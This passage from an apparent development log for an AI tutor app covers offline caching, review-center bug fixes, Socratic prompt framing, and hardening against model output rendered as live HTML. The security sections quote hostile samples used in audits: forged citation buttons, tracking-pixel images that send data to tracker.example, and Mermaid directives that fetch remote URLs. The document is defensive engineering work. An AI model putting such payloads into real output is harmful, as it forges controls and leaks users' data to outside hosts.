  rerun: a "what this session covered" recap in 20 s, no false credit).
- An answer from before a three-hour break offered follow-ups, which would
  send it as memory against the divider.
- Edit & reuse, Edit & regenerate and Up arrow on a graded practice answer put
  the grading question in the box as an Explain question, to be sent without
  its rubric. They now reopen the practice card with the answer.
- A long mistake or readiness check produced up to about 3,000 characters and
  On-device Lite cut it off mid-word at 1,800; fields now give way, the
  learner's answer first.
- "?" with focus in Request options or the New topic dialog opened the
  shortcut sheet underneath them and moved focus there, out of sight.
- At 200% text on a 320×640 phone a dock holding a session strip was 768px
  tall and pinned itself over the whole tutor, header included. Past 60% of
  the room above the navigation (not counting the question box's growth) it
  now stays in the page flow, and docks again below 50%.
- Enter with the local-model permission unticked did nothing visible, and a
  send refused at send time failed silently; both now give the reason.
- A reading that failed part-way showed Listen again with no reason; the
  engine's message now shows under the answer (a notice on On-device Lite).
- The quiz dispute note said a miss was "not saved" when it had been saved
  before the check; the disputed path now has a browser regression.

Live `qwen3.5:4b` for the review (8 generations, 393px phone): Explain 50 s
with 16 resolved citations and the topic cue; Give an example 44 s, history
exactly the followed pair (45 and 3,000 characters); then the two failures
above and their reruns (Check my understanding 13 s, Hint 9 s, Wrap up 20 s,
all citations resolved). The first Socratic replies still praised a
"previous answer" the learner never gave, and "Checking citations" never lit
up (#58). The branch was then rebased onto #83 (saved AI output rendered as
untrusted text); the difference from the pre-rebase tip is exactly #83's 22
files. Together they put the precached route screens at 903,321 bytes, over
the 900,000 budget, so the quiz and answer-check views and their styles now
load with the first quiz, as interview practice does (890,629 bytes; the quiz
state and requests stay in the tutor, and screenshots in Paper, Night and
Contrast match the stage-2 ones). Gate on the final tip: `npm run check`
(524 AI/data tests; AI eval 27 cases, hit@1 0.913; startup entry 715,643
bytes; route screens 890,629 bytes) and all 13 `npm run check:browser`
suites on the first attempt (`audit:ai-ui` 109 s, `audit:responsive` 434
layout and 367 control checks, `audit:a11y` 57 axe runs).

Still open: hiding the bottom navigation while typing (needs a physical
iPhone); a docked composer, a session strip, interview practice and quiz
follow-through on On-device Lite; titled multi-topic threads (designed in
`docs/TUTOR_THREADS_DESIGN.md`); and the server-side Socratic prompt fixes
(#58) seen live: a first reply that praises a "previous answer" the learner
never gave, a hint request answered as "your hint", and a mistake explained
before the learner is asked what went wrong. Below 481px of height, or with
very large text on a small phone, the composer is not docked, so the strip
scrolls with the page there. At 200% text on a 320px phone the tutor title
runs under the header's two 44px buttons, which are the same size as on main.

## Offline route screens reproduced on 2026-09-24

- With the app server stopped, a fresh install that had opened only Home
  replaced the whole app with "Lumen needs fresh app files" on Read, AI Tutor,
  and Settings. Reload showed the same screen. The service worker cached only
  the entry files, so the route chunks were missing until opened online, and
  every update discarded them again. The build now emits
  `offline-routes.json` listing the route screens with their static imports and
  CSS, and install precaches it. That is 19 files and 688,530 bytes beyond the
  908 KB entry. The Node server sends them uncompressed; a gzip host would send
  about 196 KB. KaTeX's JavaScript accounts for 259 KB because the tutor imports
  it directly. Lectures, search data, Mermaid, fonts, and the WebLLM runtime stay
  on demand.
- Install time, from registration to installed, is the median of five fresh
  profiles on a loaded Mac, behind a proxy that shares one link. It went from
  143 to 612 ms on localhost and from 253 to 738 ms at 50 Mbps and 10 ms (home
  Wi-Fi to the Mac). At 10 Mbps and 60 ms it went from 366 to 1,509 ms, and at
  1.6 Mbps and 150 ms from 957 to 4,776 ms. A first visit now transfers
  1,670,479 bytes instead of 973,677. The worker registers after the page's
  load event, so first paint does not change.
- Install now fails, and the working worker stays, when the list comes from
  another build, the HTML boots a different entry, or a file is missing or
  answered with HTML. A failed install deletes only its own unused cache. Two
  partial releases were served over a working one: one missing the Reader chunk,
  one with the previous build's list. Both left the previous release active and
  cached. A complete release installed and waited. The first full browser run
  of this change failed `audit:phone-ai-ui`: its dev-server worker has no build
  query or route list and turned redundant. An unversioned worker now installs
  entry-only.
- "Remove optional offline files" deleted the route chunks too. It now keeps
  every file named by the current build's list and by each cache's installed
  list. A second defect showed up while an update was waiting. The active
  worker answered the list from its cache and then refreshed that copy with the
  new build's list. The second cleanup then removed the active release's route
  screens and its entry script. The worker now neither answers nor caches the
  list at runtime. Two cleanups over a waiting update left the active cache
  complete.
- A screen whose chunk still fails now stays inside the shell. The top bar and
  navigation remain, navigating clears the error, and the message says whether
  the device is offline, the server is unreachable, or the build is incomplete.
  Only the incomplete-build case offers Repair app files. On Wi-Fi with the
  server asleep, chunk recovery reloaded into the same cached failure. It now
  probes `/api/health` first. Storage health has its own boundary, so Settings
  keeps backup export. A lecture that cannot be downloaded now gets a
  plain-language message instead of the dynamic-import error.
- The offline check used `setOfflineMode`, which does not block
  service-worker fetches, and it opened the lecture online first.
  `audit:visual` now starts its own servers and stops them. After a Home-only
  visit, Read, AI Tutor (both engines), Whiteboard, Review, Device evidence, and
  Settings must open. Read mounts the Reader there only because Home loaded
  the first lecture into memory, so the audit also evaluates every route
  screen's module from the cache. A visited lecture must reload. Against the
  foundation build the check reports the fatal screen on Read, AI Tutor, and
  Settings. The main visual pass runs the optional cleanup and asserts that
  the visited lecture is gone and every route file remains. `audit:chunks`
  bypasses the service worker and adds an offline screen, a missing file after
  its one bounded reload, and Settings without Storage health.
- Review found that the server-stopped checks still passed with a worker that
  never answered from Cache Storage. Assets are served `immutable`, and the
  worker's install fetches had filled Chrome's HTTP cache, which answered them
  after the server stopped. The visited-lecture step also navigated to the URL
  it was already on, a same-document fragment change that never reloaded. The
  audit now clears the HTTP cache after each stop, proves the server no longer
  answers, and reloads the lecture. With the same mutated worker it now fails
  on every screen and on the lecture reload.
- Repair app files deleted the caches and then called `update()`, which does
  not reinstall an unchanged worker URL. The route screens stayed uncached
  until the next release: after Repair, AI Tutor with the server stopped showed
  "Lumen's server cannot be reached". Repair could also promote a waiting
  worker whose cache it had just deleted. Repair now unregisters the worker,
  and the reload installs the build again with all 22 listed files; AI Tutor
  then opens offline. `audit:visual` runs the sequence and waits for every
  route file.
- When Home itself failed, the in-shell panel's primary Go to Home did
  nothing because the view did not change. Reload is the primary action there
  now.
- On 2026-09-25, rebased onto the startup-bundle split (#66), `audit:visual`
  failed: after a Home-only visit with the server stopped, Review did not
  render (`Failed to fetch dynamically imported module: …/ReviewCenter-….js`),
  and the module check found the review center, its card editor, the readiness
  check, and the reader's TeX renderer (`markdownMath.js`, now loaded on first
  math) missing from the route list. They are app code, so the list names them
  now: 34 files, 30 of them (773,930 bytes) beyond the 714 KB entry, about
  223 KB gzipped. The split moved code out of the entry into route files, so
  the entry plus route files fell from about 1.60 MB to 1.49 MB. The card
  editor and readiness check render outside the view container; a chunk that
  still fails there reaches the app-level boundary. `audit:app` and
  `audit:visual` now name all four.
- The same rebase kept the in-shell boundary inside the accessibility
  foundation's `<main id="main-content">`. With the network off and both the
  service worker and the HTTP cache bypassed, an ad-hoc check at 393 and
  1280 px found one main landmark with the skip link targeting it, `main`
  inert and `aria-hidden` while Settings was open and restored after it
  closed, Home's heading focused after Go to Home, no console errors, and no
  axe violations on the panel in Paper, Night, or Contrast. A first failure
  renders after route focus has moved to the main landmark, and the panel's
  alert announces it. Returning to the failed screen shows the panel at once,
  and focus lands on its `h1`. `audit:chunks` now asserts the single landmark
  and the return-visit focus; it fails when route focus is mutated to skip the
  panel's heading.

## Bugs reproduced on 2026-09-24: review center and notebook

Review center, readiness check, and notebook (issue #54):

- Importing a `lumen.cards.v1` deck threw `ReferenceError: onImportCards is
  not defined`; nothing was imported and no message appeared. Import is now a
  keyboard-operable button wired to the handler. The review audit imports a
  deck by keyboard, then re-imports it and a malformed file to check the
  duplicate and error messages.
- After "Show answer", all four grade buttons sat under the bottom navigation
  at 375×667 and 320×640. The grading panel now sticks above the navigation;
  the audit checks each button is visible and hit-testable at 375×667.
- Home showed three due counts for one deck because archived and buried cards
  were counted. Home, the sidebar badge, and the app badge now use the review
  queue's count.
- Focus fell to `<body>` after starting, revealing, grading, archiving, and
  deleting, and after each readiness answer; grades were not announced; the
  progress bar showed 1/remaining. Focus now follows the prompt, answer,
  question, or result, grades are announced, and the bar reports graded/total.
- Deleting a mistake or clipping was instant and final, and a scrim tap or
  Escape discarded a readiness check's answers. Deletions offer Undo, and a
  check in progress asks before closing.
- Burst typing into a clipping note with two clippings dropped a character and
  raised React error #185. The note now buffers keystrokes and commits after a
  pause, on blur, or when the page is hidden.
- Review and dialog fields were 10–12.5px, so iOS zoomed on focus; notebook
  rows cut titles to four characters at 320px; the FSRS Daily limits strip
  collapsed to one letter per line at 768–1100px. Fields are 16px on phones,
  row actions sit under the title, and the strip wraps.

Review of the fix branch caught two regressions of its own, each first
reproduced against the preceding build and now covered by the review audit:
the Daily limits labels broke one letter per line on every phone width (in the
default scheduler too), and a focused Undo strip expired once the pointer had
passed over it, dropping focus to `<body>`. At 200% text the grade buttons now
fall back to two columns and stay clear of the taller bottom navigation.

A second review reproduced two more against the preceding build. The Undo
strip rendered at the top of its section, so after deleting a mistake or
clipping further down the list it sat off screen while holding focus; it now
takes the deleted entry's place and scrolls into view clear of the top bar
and bottom navigation. Ending a crunch practice session left crunch mode on,
so the hero counted the weak-card practice pool (5) instead of today's queue
(2); crunch mode now ends with its session. The review audit covers both,
plus archive focus handoff and Enter-to-submit in an all-cloze readiness check.

After rebasing onto the accessibility foundation, the mistake dialog's own
inert handling and the App's modal flag could undo each other. With the dialog
open, `?` opened the shortcut sheet over it; closing the sheet removed `inert`
from the top bar, `#main-content`, and the bottom navigation while the mistake
dialog was still open. The dialog now joins the App modal flag, so the shell
stays inert until every modal closes. The review audit opens and closes the
shortcut sheet over the dialog and checks that the shell stays inert; that
check fails against the previous mechanism. It also checks that closing the
dialog returns focus to Log mistake. With the sheet on top, Escape used to
close both dialogs and discard the mistake draft. A trial move to the shared
`useModalDialog` hook also let Tab in the sheet pull focus behind it, so that
change was reverted. The dialog keeps its own key handling and ignores keys
while focus is in a dialog stacked over it. The audit presses Tab and Escape
in the sheet: focus stays in the sheet, and Escape closes only the sheet.

The gate's axe run sees only a fresh profile. An axe pass over populated
review screens in all three themes found low-contrast mistake chips (4.23:1
and 2.86:1 in Paper), a low-contrast Show answer hint (2.12:1 in Night), and
practice views with no level-one heading. All three are fixed. The
`<form role="dialog">` markup (`aria-allowed-role`) is shared with the App's
dialogs and remains open.

The first browser gate on the rebased branch failed twice. At 360px with
200% text, the session header's Undo button extended to 397px. The branch
keeps the header buttons on one line, and the count between them had shrunk
only because `overflow-wrap: anywhere` split "remaining" mid-word; the
foundation removed that. The count now fills the space between the buttons
and wraps between words. The header wraps to two rows only at large text and
stays on one line from 320px at normal size. The review audit also pressed
Enter on Import one frame before a card deletion moved focus to the next row,
so Enter opened the card editor instead of the file picker. The audit now
waits for that focus move. The crunch-practice notice now uses the
`--ai-warn` text token; its hard-coded amber measured 3.9–4.3:1.

## Bugs reproduced on 2026-09-25: forged tutor citation controls (#69)

The tutor rendered model output through marked, which passes raw HTML
through, and DOMPurify's default profile, which keeps `<button>` and
`data-*`. Against the preceding build, `audit:ai-ui` mocked an answer
containing `<button class="ai-tutor__citation" data-ai-citation="S2">Open the
forged source</button>`. It rendered as a real button, next to a forged
`<span>` and `<a>` that also carried `data-ai-citation`, and clicking it
opened `#/read/notes/part-02-mathematics/06-experiments-and-information.md`.
No `[S#]` marker produced that control, so the citation validator never saw
it. The phone fixture answer showed the same control on On-device Lite.

- Raw HTML in tutor prose and structured fields now renders as text on both
  engines. Citation buttons and web links are created by the renderer from
  `[S#]`/`[W#]` markers outside code. A bare `<br>` is the only model HTML
  kept, so table cells can still break lines.
- A quote in a link title or a code-fence language used to add attributes to
  the tutor markup, `data-ai-citation` and `style` included. Both are escaped
  now, and link labels are parsed Markdown instead of raw text.
- `audit:ai-ui` expects the forged button, span, anchor and `onerror` image
  as visible text, one citation control (the renderer's `[S#]` button), a
  plain paragraph under the forged label, and no navigation after a mouse
  click there. Against the preceding build it fails with four
  `data-ai-citation` elements. `audit:phone-ai-ui` checks the same for a
  forged button in the phone answer.
- Unit tests in `tutorMarkdown.test.mjs` and `phoneTutorMarkdown.test.mjs`
  run on the renderer output before DOMPurify, which needs a DOM. They cover
  forged buttons, `data-ai-*` on other elements, scripts, frames, event
  handlers, forms, link labels and titles, fence info strings, raw-text tags
  and structured fields, and that citations, math, code, tables and Mermaid
  source still render. Fourteen legitimate answers, the audit and fixture
  answers among them, render byte-identical markup before and after.

The Reader's renderer is unchanged. AI answers saved to notes and AI
flashcards added to the deck render there, where author HTML goes to
DOMPurify and link titles and fence languages are still unescaped. Those
screens have no citation handler; the gap remains open.

### Adversarial review of the #69 fix (2026-09-25)

Raw HTML, entities, SVG and MathML, forms, autolinks, link titles, image
alt text, tables, lists, blockquotes, KaTeX `\href`/`\htmlData` and
Mermaid labels, directives and theme CSS all stayed inert. Three paths
still led somewhere the evidence did not:

- A model could wrap a verified citation in its own link:
  `[[S1]](#/read/notes/forged-phone-route)`. Chrome follows an `<a>` when a
  `<button>` inside it is clicked, and the phone handler did not prevent
  that, so `audit:phone-ai-ui` recorded the S1 source navigation and then
  the hash moving to `#/read/notes/forged-phone-route`. On the Mac,
  `preventDefault` stopped a plain click, but the chip still sat inside a
  link to the model's URL for middle-click and open-in-new-tab. A label
  that shows a citation marker now renders without its link (entities,
  full-width forms and zero-width characters count), and the phone handler
  prevents the default action like the Mac's.
- A Markdown link to an app route, `[Open the lecture](#/read/notes/…)`,
  was a working link that opened a note no citation validated. Tutor links
  now keep only `http(s)` and `mailto` targets; relative, root, `//` and
  `#` links render as their label.
- The Mermaid SVG filter kept any `href` starting with `#`, so a `click`
  line to `#/read/…` would become a working diagram link. Mermaid 11.17
  leaves the `xlink` prefix undeclared, so those diagrams fail to parse
  today; the filter now drops every diagram link target and keeps `<use>`
  references. No lecture uses a Mermaid `click` line.

Image alt text also showed citation button markup (`alt="see <button …"`);
it now shows the marker. `audit:ai-ui` adds a wrapped citation and an app
route link to the forged answer and expects two renderer `[S#]` buttons, no
links, and no navigation after a click on the route label.
`audit:phone-ai-ui` clicks the wrapped `[S1]` and fails against the
previous build when the hash moves. `audit:mermaid` renders a well-formed
linked SVG through a stand-in Mermaid and fails when a link target
survives. Removing either link check or the image override fails the unit
tests.

## Bugs reproduced on 2026-09-25: saved AI output trusted outside the tutor (#81)

The security review of #69 named three paths where model text was trusted
more than the tutor trusts it. Against main (3020ab0), with the new audits
and a seeded probe:

- Review rendered AI flashcards, and cards made from an AI clipping, through
  the Reader's renderer. A seeded AI flashcard whose answer held
  `<button class="ai-tutor__citation" data-ai-citation="S1">`, `<img
  src="https://tracker.example/raw.png">`, `![Tracking
  pixel](https://tracker.example/pixel.png?q=saved-prompt)` and a link to
  `http://127.0.0.1:<port>/#/read/notes/…` rendered a real citation button,
  two `<img>` elements and a live link into the app. The deck page sent 16
  requests to tracker.example in 1.5 s. `audit:review` fails there with
  "AI flashcard in the deck: saved AI text rendered an <img>".
- "Create review card" on an AI clipping dropped its provenance: the card
  got the answer text and only a `part-N` tag.
- A Markdown image in a tutor answer rendered as an `<img>` and loaded
  (`img-src https:`).
- `[Open the app copy](http://127.0.0.1:<port>/#/read/…)` in a tutor answer
  was a live link. `audit:ai-ui` fails with the links
  `["http://127.0.0.1:58983/#/read/notes/…"]` where it expects only the image
  link. The http(s) check also passed `[x](http:#/read/notes/x)`, which a
  browser resolves against the page to an in-app route.

The Notebook already showed a saved answer as plain React text; it stays
that way and the audits now assert it.

- The tutor's untrusted rules move to `src/lib/untrustedMarkdown.js`, which
  does not import KaTeX. The tutor renderer adds citations, KaTeX and its
  layout on top. `renderUntrustedMarkdown` applies the rules alone to saved
  AI output; its `[S#]`/`[W#]` markers stay plain text because no evidence
  travels with saved text.
- A remote Markdown image renders as a link, "Image: alt (host)", that opens
  in a new tab. Relative, `data:` and same-host images and images labelled
  with a citation marker show their alt text. A linked image becomes the
  link's text, so links never nest.
- A link to the app's own host (any scheme or port, absolute or autolinked)
  renders as its label. Kept links carry the normalized address, and
  addresses with credentials render as text.
- Review renders a card with the untrusted profile when it carries the
  `ai-draft` tag or was made from an `ai-tutor` clipping: in the deck, review
  sessions, interview rounds and the card dialog's preview. A card made from
  an AI clipping gets `ai-draft` (first, so a tag limit cannot drop it), the
  dialog says it is an AI draft, and an edit that clears the tags keeps it.
  A card made from an AI clipping before this change gains the tag when the
  profile loads (see the review follow-up below). Learner cards keep the
  Reader renderer. No schema field was added.
- No path opens saved AI text in the Reader: "Save to notes" writes a
  clipping, whose button opens the cited lecture, and notes are created only
  by the learner. The Reader is unchanged.

Evidence:

- Unit tests (`untrustedMarkdown.test.mjs`, `tutorMarkdown.test.mjs`,
  `phoneTutorMarkdown.test.mjs`, `aiProvenance.test.mjs`) cover the hostile
  saved answer, citation-looking links, images (remote, reference, linked,
  relative, `data:`, same-host, in tables and structured fields, KaTeX
  `\includegraphics`), same-host links (absolute, autolinked, other port,
  numeric host, `http:#…`), the page-origin default, Markdown structure in
  saved text, the Reader renderer still keeping author HTML and images, and
  provenance through normalization, backup and a 40-tag card. Each of these
  mutations fails at least one test: removing the image override, the
  same-host check, the address normalization, the URL parse, the
  citation-label check or the nested-image flattening; turning the html
  tokenizers back on; dropping the clipping clause from the AI-card check;
  appending `ai-draft` last.
- `audit:ai-ui` saves a hostile answer to notes, makes a review card from
  the clipping (checking the `ai-draft` tag, the AI note and the preview),
  adds hostile AI flashcards to Review, and checks the tutor answer, the tutor
  flashcard, the Notebook clipping and both deck cards: no `<img>`, no
  control, no link to the app, the image as a link, the markup as text, and
  no request to the image host.
- `audit:review` seeds an AI flashcard, a pre-tag card from an AI clipping,
  the clipping and a learner card in a fresh context, then checks the deck,
  every card of a session, an interview round, both edit previews, that
  clearing the tags keeps `ai-draft`, the Notebook clipping, a learner card's
  `<kbd>`, and no request to the image host.
- Both audits fail against main's app sources, as described above.
- KaTeX `\includegraphics`, `\href` and `\htmlStyle` render no image, link
  or style with trust off. Mermaid did fetch; see the review follow-up below.
- Startup script: 712,278 bytes (main 711,759). Route screens beyond the
  entry: 816,191 bytes (main 814,352).
- Gate: `npm run check` passed (`audit:ai` 453/453). `npm run check:browser`
  passed all 13 suites on the first attempt with no retries. One earlier
  standalone `audit:review` run timed out waiting for the deck-import file
  chooser, before the new section; the rerun and the gate passed.

### Adversarial review of the #81 fix (2026-09-25)

The review tried to get model HTML, forged controls, remote fetches or
same-origin navigation through every storage and render path: save to notes
and the Notebook clipping, a backup round trip, a `lumen.cards.v1` export and
import, sync merge, clipping-note edits, the card dialog preview, AI
flashcard answers, mistakes and corrective cards, protocol tricks (`HTTP:`,
`//`, `http:\\`, `http:/`, `http:host`, entity-encoded schemes, spaces,
tabs, user info, trailing dots, numeric and hex IPv4 forms, ports, `[::1]`,
`xn--` names), `<picture>`/`srcset`, CSS `url()` in `style`, and KaTeX
`\href`, `\url`, `\includegraphics`, `\htmlStyle` and `\color{url(…)}`. The
Markdown renderer held: all of these came out as text, as a normalized
external link, or as a KaTeX error in a `title`. Two defects remained.

- **Mermaid diagrams in tutor answers fetched remote resources.** The first
  version of this fix recorded that Chrome sent no request for a `themeCSS`
  `url()`; that was wrong. A probe that rendered
  tutor answers through `renderTutorMarkdown` and `useMermaidDiagrams` in
  Chrome recorded requests to tracker.example from:
  - a `%%{init: {"fontFamily": "x;background-image:url(…)"}}%%` directive;
  - `themeCSS` with selectors (`rect{background-image:url(…)}`);
  - a frontmatter `config: fontFamily`;
  - an `htmlLabels: true` directive with an `<img>` label (loaded while
    Mermaid measured it; the SVG filter removes `foreignObject` only
    afterwards);
  - a flowchart node's `@{ img: "…" }` (Mermaid preloads it with
    `new Image()`);
  - a sequence actor's `properties` `icon`;
  - a `stateDiagram-v2` `classDef … mask-image:url(…)`.

  Flowchart `style`/`classDef` lines with `url()` fail to parse; state
  diagram `classDef` lines do not. A directive without an address could
  still restyle the diagram: `fontFamily: "x;position:fixed;…"` reaches the
  SVG's `<style>`, and `htmlLabels` loads a same-origin `<img>`.
- **Pre-#81 cards made from AI clippings lost provenance.** Such a card was
  recognized only through its clipping id. A card export (which carries
  tags but not `sourceClippingId`), a mistake it logged (and the corrective
  card made from it after the card was deleted), or deleting the clipping
  all left AI text rendering as trusted.

Fixes:

- The untrusted profile marks a model diagram with
  `data-diagram-author="model"`. For such a diagram, `renderMermaidDiagrams`
  calls `mermaid.initialize` with every top-level config key in `secure`.
  Mermaid then drops each directive and frontmatter `config:` key before
  applying it, so the site's font, `htmlLabels: false` and theme stay. A
  model diagram whose source, after numeric entities (`&#58;`, Mermaid's
  `#58;`) are decoded and tabs and line breaks removed, contains a web
  scheme, `//`, a backslash (YAML, JSON and CSS escapes all need one),
  `url(`, `image-set` or `@import` is shown as a `mermaid` code block. A
  marked diagram that reaches Mermaid without passing through the profile
  fails with "Diagram not drawn". Learner diagrams in the Reader keep their
  directives.
- The profile normalizer adds `ai-draft` (first, within the 30-tag limit)
  to a card whose `sourceClippingId` names an `ai-tutor` clipping.
  Normalizing again changes nothing, and sync normalizes base, local and
  remote alike, so the backfill does not look like an edit.

Evidence:

- `audit:mermaid` has a `resources` fixture. It renders nine address-naming
  tutor diagrams (including a YAML-escaped `"i\x6dg"` key and a CSS-escaped
  `u\72l(…)`), a saved-AI diagram, three directive-only tutor diagrams
  (overlay font, `htmlLabels` with a same-origin `<img>`, red `themeCSS`
  fill), a learner diagram with the same red fill, and marked model markup.
  It asserts no request to tracker.example, no same-origin label request,
  ten code blocks and no drawn diagram for the address-naming ones, no red
  fill, `position: fixed` or HTML label in the directive diagrams, the site
  font, a red fill in the learner diagram and "Diagram not drawn" for the
  marked markup. Against the branch's previous renderer and Mermaid module
  (the same as main for Mermaid) it fails with 11 requests: `/font-family`,
  `/theme-css`, `/frontmatter`, `/html-label`, `/shape-image`,
  `/actor-icon`, `/class-def`, `/yaml-escape`, `/css-escape`,
  `/saved-shape`, `/marked-markup`. With only the config lock removed, it
  fails with the same-origin label request.
- Unit tests cover the address check in 13 spellings and 4 ordinary
  diagrams, the locked config, model fences shown as code in the saved-AI
  and tutor renderers, the model marker, and Reader diagrams staying
  unmarked and drawn. Each of 10 mutations fails at least one test: the
  renderer ignoring the check, backslash, decimal or hex entity decoding,
  tab removal or schemes dropped from the check, the model marker dropped,
  the config not locked, Mermaid's default keys ignored, and the code
  fallback ignored.
- `aiProvenance.test.mjs` normalizes a pre-#81 card, a 30-tag one, a learner
  clipping's card and an unlinked card. It then deletes the clipping,
  exports and imports the deck, and logs a mistake that makes a corrective
  card. The backfill fails the test when it is removed or when it appends
  the tag last. `audit:review` asserts that the seeded pre-#81 card shows
  `ai-draft` in the deck before any edit.
- Kept as they are: a `lumen.cards.v1` file is learner-chosen content, like
  an uploaded note, so its cards render with the Reader renderer unless they
  carry `ai-draft`. Exported AI cards keep the tag (first, within the
  importer's 10-tag limit). `[W#]` citation links come from fetched search
  evidence, not model text.
- Startup script: 713,759 bytes (budget 750,000). Route screens beyond the
  entry: 816,282 bytes.
- Gate: `npm run check` passed (`audit:ai` 459/459). `npm run check:browser`
  passed all 13 suites on the first attempt with no retries.

## Bugs reproduced on 2026-09-25: tutor session framing (#82)

Endpoint probes streamed tutor requests through the real browser client
(`requestAiStream`, `fitTutorRequest` and the tutor's own action builders)
into a freshly started integrated server (`startApplicationServer`, the
`.env` values with loopback overrides and `AI_AUTH=open`) and the local
`qwen3.5:4b`. "Before" is main (1f6dcaf, same AI code as 87ad04d); "after"
is this branch. Each scenario ran once unless a count is given. The topic was
ridge regression, with 8 library passages retrieved per request.

| Scenario | Before (main) | After (this branch) |
| --- | --- | --- |
| Session start (Socratic mode prompt) | "Your previous assessment correctly identified that Ridge regression applies an L2 penalty…" before any question (7.4 s) | One cited question with no praise, 4 of 4 runs (2.9–8.7 s). Framing `open`. |
| Session start after an explanation | "Your explanation correctly identifies…" (4.5 s) | One cited question (9.6 s) |
| Check my understanding | "Your answer correctly identifies that Ridge regression shrinks coefficients…" (5.7 s) | One cited question (4.1 s) |
| Hint | "Your hint correctly identifies that the L2 penalty shrinks weights…", then a new question (4.8 s) | 6 of 6 gave one cited hint and "Try answering your previous question again", with no praise and no new question (1.4–9.4 s). Framing `hint`. |
| Next question after a reveal | "Your assessment that Ridge shrinks weights continuously… is correct" (9.0 s) | One cited question (8.5 s). Framing `open`. |
| Worked-through mistake | "Your answer contains a fundamental misconception: Ridge regression does **not** set coefficients to exactly zero…", then a geometric explanation (247 tokens, 8.7 s) | 6 of 6 asked one diagnostic question and nothing else, e.g. "When you said ridge regression sets coefficients to exactly zero, what part of your reasoning led you to that conclusion? [S1]" (27–33 tokens, 0.9–8.3 s). None stated or hinted at the expected answer. Framing `diagnose`. |
| Reply to the diagnostic question | Assessed, then asked (9.3 s) | "Your answer is a **misconception** because you described the behavior of Lasso…", then one question (5.0 s). Framing `answer`: the explanation comes after the learner replies. |
| Answer to the tutor's question | "Your understanding is partly correct…" (6.3 s) | Assessed as a misconception with the reason, then one question, 3 of 3 (4.3–10.1 s). Framing `answer`. |
| Answer after a hint | "Your assessment is correct…" (8.2 s) | "Your understanding is correct…", then one question, 2 of 2 (2.5–8.2 s). Framing `answer`. |
| Reveal (Explain task) | Step-by-step answer (17.2 s, 519 tokens) | Step-by-step answer (24.1 s, 569 tokens). Reveals get no Socratic framing. |
| Wrap-up (Summarize task, no sources) | Recap that credits nothing (15.2 s) | Recap with "What I revealed" that credits nothing (19.0 s). No Socratic framing. |
| Grounded Explain, stream | `validating` ("Checking completion and grounding before finalizing the answer.") at 9,880 ms, reported after the check had passed; first delta at 9,880 ms | Order `start > approach > preparing > generating > validating > delta > complete`. `validating` ("Checking the answer's citations against the supplied sources.") at 9,302 ms, reported before the check; first delta at 9,302 ms |
| Grounded Explain, JSON | 10.8 s | 14.4 s. The response keys did not change. |

- The Socratic task instruction told the model to assess "when the learner
  has just answered your previous question", on every Socratic turn. The
  4B model applied it to turns where the learner had answered nothing. The
  server now chooses one framing per turn, so the model never gets that
  condition.
  - `diagnose`: the message opens with "Work through this mistake".
  - `hint`: the message asks for a "hint for your last question".
  - `open`: the message says "I have not answered", or does not follow a
    question from the tutor.
  - `answer`: the tutor's last turn ends by asking a question (a closing
    sentence that opens as an offer, such as "Want to see an example?", or
    with "Does that make sense?" does not count), the learner is trying
    again after a hint, or the message answers a question it quotes
    (`My answer: …`).
- The tutor's action prompts now say it in words: the Socratic mode prompt,
  the lesson starters, Check my understanding, Hint and Next question all say
  "I have not answered…". The notebook bridge asks the tutor to first ask
  what went wrong and not to explain until the learner replies. Wording saved
  in older conversations still maps to the same framing and still does not
  count as an answer in a session.
- The first version of the rule looked at the tutor turn's last paragraph.
  But the client's conversation window collapses whitespace, and ordinary
  sends keep `[S#]` labels. So a question whose label sat on its own line,
  or a hint turn ending "Try answering your previous question again", would
  not have counted as a question. The rule now reads the history as the
  client sends it: code and labels are removed, and the text must end with a
  question. A reply after a hint is always an answer. The deterministic tests
  build each request through `tutorConversationWindow`.
- Remaining model limits: 4 of 6 hints stated most of the mechanism ("the
  smooth curvature of the L2 ball prevents this exact alignment") even
  though the prompt says not to reveal the answer. A fifth came close. Three
  of the four session starts stated the ridge and lasso contrast before
  asking about it.
- Checking citations was never shown. The server reported `validating` only
  after a grounded draft passed, never for a failed draft and never on the
  JSON transport. It also came in the same read as the held answer and
  `complete`, so the step was never drawn. Both transports now report
  `validating` before each terminal draft is checked. A draft that fails its
  check returns to `generating` and is checked again, bounded by the
  one-shot recoveries.
- The check takes milliseconds, so the server-side gap is still about
  0 ms. The fix that makes the step visible is on the client. The tutor
  waits 300 ms on a `validating` event while its step list is visible (not
  on a hidden page; Stop ends the wait). `requestAiStream` stops with
  `AI_CANCELLED` or `AI_CLIENT_TIMEOUT` if the request ended during that
  wait, instead of applying the buffered answer. Each step is announced once
  per answer, even when a failed draft makes the tutor go through Drafting
  and Checking twice.
- Live UI in headless Chrome at 393 px, with each server and the real model:

  | Question | Main | This branch |
  | --- | --- | --- |
  | "Explain the bias-variance trade-off in ridge regression, in under 150 words." | Checking citations never drawn; not announced (11.7 s) | Drawn for 18 frames (283 ms) with the server's message; "Checking citations…" announced once (17.1 s) |
  | "Why must a final holdout set stay untouched until the end of model development?" | Drawn for 1 frame (0 ms); not announced (23.5 s) | Drawn for 18 frames (283 ms); announced once (46.0 s, 1,195 tokens) |

Evidence:

- `server/ai/quality.test.mjs` pins the framing of 25 tutor turns, before
  and after the server's own request validation. Each turn
  is built by the client's own builders (Socratic mode prompt, lesson
  starter, Check my understanding, Hint, Next question, notebook bridge,
  answer-check draft), including their older wording. It also pins each
  framing's system and format text, and the absence of any assessment
  wording on turns without an answer. It also pins that reveals and
  wrap-ups get no Socratic framing, that a hint's grounding repair asks for
  a cited hint, and the phase order on both transports: grounded, failed
  then regenerated, failed twice (never released, `validating` twice),
  structured and source-free. A final test checks the real stream endpoint's
  event order and that the JSON envelope keys did not change.
- Client tests pin the action prompts, the earlier wording still being
  recognized, the 300 ms hold rule, and a Stop during the hold beating the
  answer and `complete` buffered behind it.
- `audit:ai-ui` checks that the requests of a real Socratic session, hint,
  next question, notebook bridge and answer check get their framing. It also
  sends a tutor question to the integrated server's own stream, in front of
  a scripted Ollama, delivered in one piece. "Checking citations" must be
  drawn for at least 2 frames, come from that `validating` event, show
  before the answer, and be announced exactly once.
- Mutations: with the hold removed, `audit:ai-ui` fails with "Checking
  citations was never on screen". With `validating` moved back after the
  check, 6 stream tests fail. Without the after-hint rule, 2 framing tests
  fail. With the paragraph rule restored, 3 fail. With offer phrases matched
  anywhere in the closing sentence, 2 fail: "which quantity do you want to
  minimize?" was treated as an offer, so the answer to it went unassessed.
  An earlier draft of this branch had that bug; offers now count only at the
  start of the sentence.
- Startup script: 715,643 bytes (budget 750,000; the same as main). Route
